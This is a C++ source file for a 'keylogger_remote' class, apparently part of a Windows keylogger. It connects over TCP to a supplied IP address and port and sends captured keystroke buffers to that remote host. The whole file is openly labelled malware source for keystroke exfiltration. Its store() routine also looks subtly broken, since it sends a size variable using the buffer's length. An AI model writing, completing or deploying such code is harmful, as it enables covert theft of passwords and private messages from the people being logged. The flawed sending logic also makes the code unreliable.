#include "./keylogger_remote.hpp"

keylogger_remote::keylogger_remote(size_t p_buffer_size, string p_ip_address, int p_port) : keylogger(p_buffer_size)
{
	cout << p_ip_address << " - " << p_port << endl;

	a_socket = 0;

	WSADATA t_wsa_data;

	int t_result = 0;

	t_result = WSAStartup(MAKEWORD(2,0), &t_wsa_data);

	cout << "WSAStartup" << endl;

	if(t_result != NO_ERROR)
	{
		cerr << "connect : " << t_result << " : " <<  WSAGetLastError() << endl;
		exit(EXIT_FAILURE);
	}

	SOCKADDR_IN t_sockaddr_in;
	t_sockaddr_in.sin_addr.s_addr = inet_addr(p_ip_address.c_str()); //inet_addr(p_ip_address);
	t_sockaddr_in.sin_family      = AF_INET;
	t_sockaddr_in.sin_port		    = htons(p_port);

	a_socket = socket(AF_INET,SOCK_STREAM,0);

	cout << "socket" << endl;

	if(a_socket == INVALID_SOCKET)
	{
		cerr << "connect : " << t_result << " : " <<  WSAGetLastError() << endl;
		WSACleanup();
		exit(EXIT_FAILURE);
	}

	t_result = connect(a_socket, (SOCKADDR *)&t_sockaddr_in, sizeof(t_sockaddr_in));

	cout << "connect" << endl;

	if(t_result != NO_ERROR)
	{
		cerr << "connect : " << t_result << " : " <<  WSAGetLastError() << endl;
		WSACleanup();
		exit(EXIT_FAILURE);
	}
}

keylogger_remote::~keylogger_remote()
{
	closesocket(a_socket);

	WSACleanup();
}

int keylogger_remote::send_complete(int p_socket, void** p_buffer, size_t p_bytes_to_send)
{
	int t_total_sended_bytes = 0;

	while (p_bytes_to_send > 0)
	{
		int t_sended_bytes = send(p_socket, (char*) p_buffer + t_total_sended_bytes, p_bytes_to_send, 0);

		switch (t_sended_bytes)
		{
			case -1:
				return -1;

			case 0:
				return 0;
		}

		p_bytes_to_send -= t_sended_bytes;
		t_total_sended_bytes += t_sended_bytes;
	}

	return t_total_sended_bytes;
}

void keylogger_remote::store()
{
	size_t t_size = a_buffer->length();

	send_complete(a_socket, (void**) &t_size, a_buffer->length());

	send_complete(a_socket, (void**) a_buffer->c_str(), a_buffer->length());
}
